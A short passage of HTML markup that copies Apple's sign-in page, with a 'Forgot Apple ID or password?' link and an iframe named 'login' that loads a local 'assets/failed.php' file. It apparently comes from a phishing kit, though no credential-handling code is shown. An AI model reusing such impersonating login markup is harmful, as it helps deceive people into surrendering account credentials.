...
<iframe width="100%" height="100%" name="login" id="login" src="assets/failed.php" frameborder="0" scrolling="no"></iframe>
</div>
</div>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="container">
<div class="forgot" id="forgot-link"><a href="#">Forgot Apple&nbsp;ID or password?</a></div>
